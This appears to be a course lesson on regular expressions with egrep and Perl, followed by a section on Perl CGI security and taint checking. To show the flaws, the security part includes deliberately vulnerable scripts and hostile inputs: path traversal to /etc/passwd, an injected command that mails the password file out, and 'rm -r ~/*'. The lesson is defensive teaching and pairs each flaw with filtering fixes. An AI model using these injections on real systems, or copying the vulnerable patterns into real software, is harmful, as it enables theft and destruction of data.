@@ -1,0 +1,386 @@
+#---SET-HTML bslash=&#92;
+*Title: PERL Security and Regular Expressions 
+*Author: Andrew Cantino
+*Image-center: email.jpg
+*Image-center: camel.gif 
+
+---------
+
+*TOC
+
+---------
+
+* Introduction
+Regular expressions are an incredibly powerful shorthand for searching, replacing, and matching strings.  A very simple regular expression might look like:
+^<<
+/^andrew/
+^>>
+or
+^<<
+/(this|that)/
+^>>
+We're going to learn about regular expressions, then talk about how we can use them to make our PERL CGI scripts more secure.
+* Learning regular expressions with Grep
+|Grep| is a UNIX command-line tool designed for searching files.  Given a search pattern (a regular expression) and a file, |grep| returns all of the lines in the file that contain the search pattern.  |Grep| can handle most regular expressions, so we're going to be using it as an introductory tool, before moving on to PERL regular expressions.  We're actually using a version of |grep| called |egrep|, and here is the syntax:
+^<<
+egrep 'regular expression' filename
+^>>
+Lets start by making a file to experiment on.  [Login to your shell account (:l1.html#SSH)] and use |pico| or another editor to create a new file called ''testfile'', containing at least the following lines (you can copy and paste):
+^<<
+mississippi
+andrew
+dog
+cat
+john
+john doe
+missouri
+the quick brown fox jumps over the lazy dog.
+kayak
+^>>
+Now, lets |egrep| the file.
+^<<
+-jailshell-2.05b$ egrep 'doe' testfile 
+john doe
+^>>
+Notice that |egrep| returned the one line in the file that contained ''doe''.  Lets try a few others:
+^<<
+-jailshell-2.05b$ egrep 'rew' testfile 
+andrew
+-jailshell-2.05b$ egrep 'ss' testfile 
+mississippi
+missouri
+^>>
+The expression ''rew'' matched one line, while the expression ''ss'' occurred both in ''mississippi'' and ''missouri''.  Now, what if we want to match things at the beginning or end of a line?  The special carrot (|^|) character, if it appears at the beginning of a regular expression, matches the beginning of a line.  Likewise, the special dollar sign (|$|) character, when at the end of an expression, matches the end of a line.
+^<<
+-jailshell-2.05b$ egrep '^a' testfile 
+andrew
+-jailshell-2.05b$ egrep '^mi' testfile 
+mississippi
+missouri
+-jailshell-2.05b$ egrep '^john' testfile 
+john
+john doe
+-jailshell-2.05b$ egrep '^john$' testfile 
+john
+^>>
+If you actually wanted to make a |^| or |$|, you would need to ''escape'' them, just like we have to do with backslashes in PERL.  To search for a carrot, you would do |\^|.
+* More about regular expressions
+The period (|.|) character will match any single character, except the new line (|%bslash%n|) character.  For example:
+^<<
+-jailshell-2.05b$ egrep 'd.g' testfile 
+dog
+the quick brown fox jumps over the lazy dog.
+-jailshell-2.05b$ egrep '..ss.ss....' testfile 
+mississippi
+^>>
+** Alternation
+The pipe (|\||) character "separates alternatives[Note: http://en.wikipedia.org/wiki/Regular_expression]."  For example:
+^<<
+-jailshell-2.05b$ egrep 'andrew|john' testfile 
+andrew
+john
+john doe
+^>>
+** Quantification
+Quantifier special characters specify how many times the preceding character can match.  Here is a table of quantifiers:
+
+	! _Quantifiers_ !
+	! _Character_ ! _Description_ !
+	!  |+| ! The plus sign indicates that the preceding character may occur one or more times  !
+	!  |?| ! The question mark indicates that the preceding character may occur at most one time  !
+	!  |*| ! The asterisk indicates that the preceding character may occur zero or more times     !
+	!  |{n}| ! The preceding character must occur |n| times.                  !
+	!  |{n,}| ! The preceding character must occur at least |n| times.      !
+	!  |{n,m}| ! The preceding character must occur at least |n| times, but not more than |m| times. !
+
+And some examples:
+^<<
+-jailshell-2.05b$ egrep 'a.+w' testfile 
+andrew
+-jailshell-2.05b$ egrep '^.{3}$' testfile 
+dog
+cat
+^>>
+The expression |a.+w| matches an ''a'', followed by any number of characters (except zero), followed by a ''w''.  The expression |^.{3}$| uses |^| and |$| to lock to the beginning and end of the line, and matches any three characters.  It finds any lines that contain only three characters.
+** Grouping
+You can use parenthesis and alternation to group alternatives.
+^<<
+-jailshell-2.05b$ egrep '^.(o|a).$' testfile 
+dog
+cat
+-jailshell-2.05b$ egrep '(ss|fox|doe)' testfile 
+mississippi
+john doe
+missouri
+the quick brown fox jumps over the lazy dog.
+^>>
+The expression |(ss\|fox\|doe)| matches lines containing |ss| or the word |fox| or the word |doe|.  Parentheses also cause the regular expression engine to remember their contents.  This is very useful for pulling sub-expressions out of strings, as we'll see in a little bit.  It also lets us do some powerful matching:
+^<<
+-jailshell-2.05b$ egrep '(.)(.).\2\1' testfile 
+mississippi
+kayak
+^>>
+Escaped numbers (|\1|, |\2|, |\3|, etc.) return the value of the corresponding parentheses set.  Therefore, the expression |(.)(.).\2\1| matches any two characters, followed by any single character, followed by the first two matched characters in reverse.  It finds the ''ssiss'' in ''mississippi'', and notices that ''kayak'' is a palindrome!
+** Character classes
+Character classes are created with square brackets (|\[]|).  They represent a list of alternative characters and are basically shorthand for groups.  The character class |\[abc]| will match any single character if it is an ''a'', ''b'', or ''c'', and is equivalent to |(a\|b\|c)|.  It is important not to confuse these with groups because character classes are ''a list of alternative characters'', _not_ words.  Therefore, |\[andrew]| matches any of the characters ''a'', ''n'', ''d'', ''r'', ''e'', and ''w'', _not_ the string ''andrew''.  The carrot (|^|) character at the beginning of a character class means ''not these characters''.  Don't confuse it with a carrot at the beginning of the regular expression, which matches to the beginning of the line, as we saw before.  Examples:
+^<<
+-jailshell-2.05b$ egrep '^[mispour]+$' testfile 
+mississippi
+missouri
+-jailshell-2.05b$ egrep '^[^mispour]+$' testfile 
+cat
+kayak
+^>>
+The first expression matches any line that contains only the characters ''m'', ''i'', ''s'', ''p'', ''o'', ''u'', and ''r''.  The second expression matches only a line that _does not_ contain those characters.
+*** Character class ranges
+A nice feature of character classes is that you can use ranges.  Ranges are specified with the dash (|-|) character, and they look like this: |\[a-z]|.  You can also combine multiple ones.  This would match any alphanumeric character: |\[a-zA-Z0-9]|.
+
+** Try it for yourself!
+Now try these examples for yourself!  Try to come up with lots of different patterns and experiment with them.  I recommend that you remember to use the shell history (hit the up arrow on your keyboard) to save yourself typing.
+
+
+* PERL Regular Expressions
+Regular expressions in PERL are very similar to the regular expressions that we've just covered.  PERL just takes them one step further.  For the definitive guide to PERL regular expressions, see the [perldoc perlre page (http://www.perl.com/doc/manual/html/pod/perlre.html)].
+** Simple matching
+In PERL, regular expressions can take quite a few forms, but the most common uses the |=\~| operator.  The |=\~| operator performs a regular expression test on the variable to the left of the operator, using the expression to the right of the operator.  In general, PERL regular expressions will be inside forward slashes (|//|).  Here is an example:
+^<<
+#!/usr/bin/perl
+$a = "this is my test string";
+if ($a =~ /test/) {
+	print "Yup, it matches!";
+}
+^>>
+And another example.  (I'll leave out the shebang line for brevity.)
+^<<
+$a = "My name is Andrew.";
+if ($a =~ /name is (\w*)\./) {
+	print "Yup, it matches, and your name is $1!\n";
+}
+^>>
+_Output:_ Yup, it matches, and your name is Andrew!
+
+	* Here I've used the special |\w| character, which means "any word character."  In other words, alphanumeric plus underscore (\_).  I'll list some more special characters soon.  The subexpression |(\w*)\.| means: find any number of words characters up to a period.  Recall that I had to escape the period because period has a special meaning in regular expressions.
+	* In PERL, anything inside of parenthesis is memorized, and is available as |$1|, |$2|, |$3|, etc. after the regular expression has parsed.
+
+** Perl regular expression special characters
+Citing from [perlre (http://www.perl.com/doc/manual/html/pod/perlre.html)]:
+^<<
+    \w  Match a "word" character (alphanumeric plus "_")
+    \W  Match a non-word character
+    \s  Match a whitespace character
+    \S  Match a non-whitespace character
+    \d  Match a digit character
+    \D  Match a non-digit character
+^>>
+
+** Search and replace
+Another common regular expression formulation in PERL looks like:
+^<<
+$variable =~ s/find/replace/gi;
+^>>
+	* |=\~ s///| does a find and replace.  Both the find and replace strings can be full regular expressions.
+	* The |gi| at the end of the expression are ''modifiers''.  You can modify any regular expression, not just search and replace.  Here are the meanings of these two modifiers:
+		* |i| -- do case-insensitive matching
+		* |g| -- find all occurrences of the match, not just one (i.e., global search and replace)
+
+More examples:
+^<<
+# Remove HTML tags (not a particularly good way to do this)
+$variable =~ s/\<[^\>]+\>//g;
+
+# Filter input, leaving only numbers.
+$shouldBeNumber =~ s/[^0-9]//g;
+^>>
+
+** Greedy vs. ungreedy matching
+The following is copied from [Steve Litt's PERLs of Wisdom: PERL Regular Expressions (http://www.troubleshooters.com/codecorn/littperl/perlreg.htm#Greedy)]:
+
+"Perl regular expressions normally match the longest string possible. For instance:
+^<<
+my($text) = "mississippi";
+$text =~ m/(i.*s)/;
+print $1 . "\n";
+^>>
+Run the preceding code, and here's what you get:
+^<<
+ississ
+^>>
+It matches the first |i|, the last |s|, and everything in between them. But what if you want to match the first |i| to the |s| most closely following it?  Use this code:
+^<<
+my($text) = "mississippi";
+$text =~ m/(i.*?s)/;
+print $1 . "\n";
+^>>
+Now look what the code produces:
+^<<
+is
+^>>
+Clearly, the use of the question mark makes the match ungreedy."  Understanding greedy vs. ungreedy matching is very helpful when writing regular expressions.
+
+** Learning more
+We've only scratched the surface of what regular expressions can do.  To learn more, try these resources:
+	* [PERLRE (http://www.perl.com/doc/manual/html/pod/perlre.html)]
+	* [PERL Regular Expressions (http://www.troubleshooters.com/codecorn/littperl/perlreg.htm)]
+
+* PERL Security
+	# "The problem with CGI scripts is that each one presents yet another opportunity for exploitable bugs. CGI scripts should be written with the same care and attention given to Internet servers themselves, because, in fact, they are miniature servers. Unfortunately, for many Web authors, CGI scripts are their first encounter with network programming." -- [w3.org Security Faq (http://www.w3.org/Security/Faq/wwwsf4.html)]
+
+Now that we've talked about regular expressions, we're equipped to discuss a very important issue: PERL and CGI security.  Today we will cover taint checking and PERL security.  In the next few lessons, we will cover other aspects of security in web publishing.
+
+Whenever you're writing CGI scripts, it is essential that you take security into account.  Maintaining good security makes it harder for someone to accidentally or maliciously gain access to your account, your server, and your data.  Keep these points in mind:
+
+	* A computer always does what you tell it to.  The idea is to make sure that it's doing what you intend it to do.
+	* Make sure that someone else cannot accidentally or maliciously make your code do something you don't want it to do.
+	* Malformed input can compromise the system, so we need to make sure input looks like what we expect.
+	* _Never_ trust data coming from an outside source.  Never hide things through obscurity.
+
+Let me show you a few examples where security is an issue.
+** An example security hole
+The following CGI script is _not secure_!  Don't use it!
+^<<
+#!/usr/bin/perl
+use CGI;
+$c = new CGI;
+print $c->header();
+print "<html><head><title>Data lookup</title></head><body>\n";
+$dataFile = "/home/acantino/datafiles/" . $c->param('file');
+open(FILE, $dataFile);
+@data = <FILE>;
+close(FILE);
+print "Data:<br>\n";
+print @data;
+print "</body></html>";
+^>>
+What did we do wrong here?  Lets see... if we name this CGI |test.cgi|, and connect to |test.cgi?file=testfile|, where |testfile| exists in |/home/acantino/datafiles|, then we will get the contents of |testfile|.  If everything in that directory is a file that we want to share with the web, than this is safe, right?  _No!_
+	* What if we go to |test.cgi?file=../.bash_history|?  Then my shell history file is displayed, including passwords, if I've been so foolish as to type passwords at the command line.
+	* Even worse: |test.cgi?file=../../../../etc/passwd|  That's the system password file!
+Okay, so how do we fix this?  One would think that filtering out periods (|.|) would be sufficient...
+^<<
+...
+$file = $c->param('file');
+$file =~ s/[\.]//g;
+$dataFile = "/home/acantino/datafiles/" . $file;
+open(FILE, $dataFile);
+...
+^>>
+Now, when someone enters |../../../../etc/passwd|, the system sees: |////etc/passwd|.  This isn't a valid path, so that's okay, although we had better filter out slashes too, just to be safe: |$file =\~ s/\[\.%bslash%/]//g;|  However, we haven't filtered out the tilde (|\~|) or pipe (|\||) characters, among others.  These can also be abused.  In general, it is _never_ safe to just remove characters that you think are dangerous.  Rather, you need to filter out all characters except the ones that you want:
+^<<
+$file = $c->param('file');
+$file =~ s/[^a-zA-Z0-9]//g;
+^>>
+That does it!  Now, the _only_ characters that can be in |$file| are |a| through |z|, |A| through |Z|, and |0| through |9|.  At minimum, always do this!
+** A second example
+One way to send an e-mail from PERL would look like this[Note: Example borrowed from http://www.extropia.com/tutorials/security/index.html]:  (Again, _don't_ actually do this!)
+^<<
+#!/usr/bin/perl
+use CGI;
+$c = new CGI;
+$mail_to = $c->param('email');
+print $c->header();
+if ($mail_to =~ /.*?\@.*?\..*?/) {
+        open (MAIL,"|/usr/lib/sendmail $mail_to");
+        print MAIL "To: $mailto\nFrom: me@test.com\n\n";
+        print MAIL "This is a very insecure example e-mail!\n";
+        close(MAIL);
+        print "sent an e-mail!\n";
+} else {
+        print "Sorry, not an e-mail address!\n";
+}
+^>>
+What's wrong with this?  It'll only send e-mail to an address that looks like |someone@something.com|.  However, what if someone entered the following:
+^<<
+junk@notreal.com; mail bhat@crackers.org < /etc/passwd;
+^>>
+Because the |open| command uses a pipe (|\||), it is actually executing a shell, and therefore the semi-colon delimits a new command and |open| both sends the e-mail and also sends a second e-mail to |bhat@crackers.org| containing the password file!  They could even do this:
+^<<
+junk@notreal.com; rm -r ~/*;
+^>>
+That would delete everything you own!  Don't try it!  Here, like above, we need to filter out everything that couldn't be in an e-mail address:
+^<<
+$mail_to =~ s/[^a-zA-Z0-9\.\-\_\@]//g;
+^>>
+
+To make the |open| command more secure, avoid pipes, explicitly use |>|, |>>|, or |<|, and use |open| with this syntax:
+^<<
+open(FILEHANDLE, "<", $filepath);
+^>>
+
+** Commands to be careful of
+Besides |open|, you also need to be very careful when using any command that executes a shell or code.  Use the following extremely carefully, and always completely filter anything coming from the Internet or user.
+	* |backticks (``)|
+	* |system()|
+	* |eval()|
+
+* Read more
+The following sites are excellent:
+	* [Introduction to web security (http://www.extropia.com/tutorials/security/index.html)]
+	* [Perl CGI Security Notes by Chris (http://users.sdsc.edu/~cedwards/securitynotes.html)]
+
+* PERL Taint Checking
+Because CGI scripts are notorious for security holes, PERL provides something called ''taint checking''.  Tainted data is data that has come from a user and has not been filtered.  Taint checking is a ''run-time''[Note: Here, run-time means that the PERL interpreter does taint checking as it interprets your program at run-time -- as the program is running.] process that limits where tainted data can be used.
+** Turning on taint checking
+In your CGI script, use the |-T| option when calling PERL.  I also recommend that you redirect STDERR so that you can maintain an error log for your script.
+^<<
+#!/usr/bin/perl -T
+$errorLog = "/home/acantino/public_html/test/error";
+open (STDERR, ">>$errorLog");
+^>>
+
+** Tainted data
+Any data that has come from a user will be internally marked as tainted.  Any time you add tainted data to existing data, the existing data becomes tainted.  PERL will exit with an error when you try to use tainted data in a function that could be potentially dangerous, such as |system|, backtick operators, piped |open()|, etc.
+
+Because taint checking is a runtime process, a bad script will usually run, but not function properly, so you have to thoroughly test your code.
+
+** Untainting data
+The whole point of taint checking is to make your script securely use user data.  To do this, we have to untaint data with regular expressions.  The only[Note: Well, almost.  The only 'good' way to untaint data!] way that you can untaint data is to pull out a sub-expression from your user data:
+^<<
+$email = $c->param('email');   # tainted
+$email =~ m/^([a-zA-Z0-9\.\_\-\@]*)/;   # $email still tainted
+$email = $1;   # $email no longer tainted
+^>>
+PERL assumes that if you're taking sub-expressions, you know what you're doing.  _Never_ do this: |$email =~ m/^(.*)$/;|  That defeats the whole purpose of taint checking!
+
+** Other issues
+Taint checking also slightly modifies the functioning of |system()|, |require()|, and |use()| commands.  You may see something like the following:
+^<<
+Insecure $ENV{PATH} while running with -T switch at test.cgi line 9.
+^>>
+This occurs because PERL taint checking requires you to specify a secure path.  If you see this, then you need to set your $ENV{PATH} variable at the top of your script.  The following two lines should work in conjunction with always using absolute paths to anything you access (which you should be doing anyway):
+^<<
+delete @ENV{qw(IFS CDPATH ENV BASH_ENV)};   # Make %ENV safer
+$ENV{'PATH'} = '/bin:/usr/bin:/usr/local/bin';
+^>>
+
+I highly recommend that you read the following page to learn more:
+	* [CGI/Perl Taint Mode FAQ (http://gunther.web66.com/FAQS/taintmode.html)]
+
+* Security issues with GET and POST
+As a final side note, there are a few security concerns that distinguish GET and POST when used in CGI scripts.
+	* Since GET shows up in a script's url, it is visible in the URL bar of a browser.  Therefore,  anything sent by GET could be ''[shoulder surfed (http://www.google.com/search?hl=en&lr=&client=safari&rls=en-us&q=define%3A+shoulder+surf&btnG=Search)]''.
+	* GET is recorded in server logs, while POST usually is not.  Therefore, anything private sent in a GET request will be logged and backed up by the server administrator -- possibly a privacy violation.
+	* When you click on a link from one website to another, the original website's URL, _including GET fields_, is sent to the receiving website and will show up in _their_ logs -- definitely a security and privacy issue.
+
+Clearly, POST is usually better than GET.  Nonetheless, neither is really secure.  It's still not safe to embed raw passwords or confidential information in either GET or POST.  Use cookies as session keys instead, and read the [AppSec FAQ (http://www.owasp.org/documentation/appsec_faq.html)].
+
+
+---------
+
+* Suggested Assignments
+** Play with RegEx
+Spend some time playing with RegEx, grep, and PERL.  Try any of the following:
+	* Download a [dictionary file or word list (http://wordlist.sourceforge.net/)] and grep it for interesting words.
+	* Write a PERL program that validates e-mail addresses, phone numbers, etc.
+	* Use regular expressions in some PERL code.
+
+** Write a secure CGI script
+Try writing a CGI script that takes data from the user and sends an e-mail message or opens a file in a secure way.  Think about what we've learned and be careful.  (Perhaps you should show me the script once you've written it, so we can make sure it's safe to put online.)
+
+** Read more!
+Read about CGI and web security at these sites:
+	* [w3.org Security FAQ (http://www.w3.org/Security/Faq/wwwsf4.html)]
+	* [Introduction to web security (http://www.extropia.com/tutorials/security/index.html)]
+	* [Perl CGI Security Notes by Chris (http://users.sdsc.edu/~cedwards/securitynotes.html)]
+
+---------
+
+[Back to Course Index (:.)]
